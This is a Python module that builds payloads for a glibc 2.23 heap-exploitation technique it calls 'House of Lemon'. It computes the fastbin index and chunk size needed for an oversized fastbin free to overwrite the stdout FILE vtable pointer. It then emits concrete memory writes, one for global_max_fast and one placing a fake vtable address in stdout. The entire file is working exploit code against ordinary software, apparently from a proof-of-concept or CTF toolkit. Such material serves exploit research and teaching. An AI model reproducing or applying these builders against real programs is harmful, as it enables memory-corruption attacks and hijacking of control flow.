"""House of Lemon glibc 2.23 payload builders."""

from __future__ import annotations

from dataclasses import dataclass


STDOUT_VTABLE = 0xD8
MAIN_ARENA_FASTBINS = 0x08
VALIDATED_REQUEST_SIZE = 0x17B0
VALIDATED_CHUNK_SIZE = 0x17C0
UINT64_LIMIT = 1 << 64


@dataclass(frozen=True)
class MemoryWrite:
    address: int
    data: bytes
    label: str


@dataclass(frozen=True)
class LemonPlan:
    request_size: int
    chunk_size: int
    fastbin_index: int
    stdout_vtable_addr: int
    fake_vtable_addr: int


def _check_uint64(name: str, value: int) -> None:
    if not isinstance(value, int) or isinstance(value, bool):
        raise TypeError(f"{name} must be an integer")
    if value < 0 or value >= UINT64_LIMIT:
        raise ValueError(f"{name} must fit uint64")


def _pack64(value: int) -> bytes:
    _check_uint64("value", value)
    return value.to_bytes(8, "little")


def build_house_of_lemon(
    *,
    stdout_addr: int,
    main_arena_addr: int,
    fake_chunk_header_addr: int,
    request_size: int = VALIDATED_REQUEST_SIZE,
    global_max_fast: int = 0x2000,
) -> LemonPlan:
    """Calculate the validated glibc 2.23 fastbin-overflow target."""

    for name, value in {
        "stdout_addr": stdout_addr,
        "main_arena_addr": main_arena_addr,
        "fake_chunk_header_addr": fake_chunk_header_addr,
        "global_max_fast": global_max_fast,
    }.items():
        _check_uint64(name, value)

    if request_size != VALIDATED_REQUEST_SIZE:
        raise ValueError("this PoC branch requires request_size 0x17b0")
    if global_max_fast < VALIDATED_CHUNK_SIZE:
        raise ValueError("global_max_fast must allow chunk size 0x17c0")

    stdout_vtable_addr = stdout_addr + STDOUT_VTABLE
    fastbins_y = main_arena_addr + MAIN_ARENA_FASTBINS
    if stdout_vtable_addr < fastbins_y:
        raise ValueError("stdout vtable slot must be after fastbinsY")

    delta = stdout_vtable_addr - fastbins_y
    if delta % 8 != 0:
        raise ValueError("stdout vtable slot is not qword-aligned from fastbinsY")

    fastbin_index = delta // 8
    chunk_size = (fastbin_index + 2) << 4
    if chunk_size != VALIDATED_CHUNK_SIZE:
        raise ValueError("addresses do not match the validated 2.23 layout")

    return LemonPlan(
        request_size=request_size,
        chunk_size=chunk_size,
        fastbin_index=fastbin_index,
        stdout_vtable_addr=stdout_vtable_addr,
        fake_vtable_addr=fake_chunk_header_addr,
    )


def build_house_of_lemon_payload(
    *,
    stdout_addr: int,
    main_arena_addr: int,
    fake_chunk_header_addr: int,
    global_max_fast_addr: int | None = None,
    global_max_fast: int = 0x2000,
) -> tuple[MemoryWrite, ...]:
    """Build concrete writes for the validated Lemon sink.

    The stdout vtable write is the effect produced by the oversized fastbin
    free.  ``global_max_fast_addr`` is optional because many exploit chains use
    a separate primitive to enlarge it before freeing the large chunk.
    """

    plan = build_house_of_lemon(
        stdout_addr=stdout_addr,
        main_arena_addr=main_arena_addr,
        fake_chunk_header_addr=fake_chunk_header_addr,
        global_max_fast=global_max_fast,
    )

    writes = []
    if global_max_fast_addr is not None:
        _check_uint64("global_max_fast_addr", global_max_fast_addr)
        writes.append(
            MemoryWrite(
                global_max_fast_addr,
                _pack64(global_max_fast),
                "global_max_fast",
            )
        )

    writes.append(
        MemoryWrite(
            plan.stdout_vtable_addr,
            _pack64(plan.fake_vtable_addr),
            "stdout vtable slot",
        )
    )
    return tuple(writes)
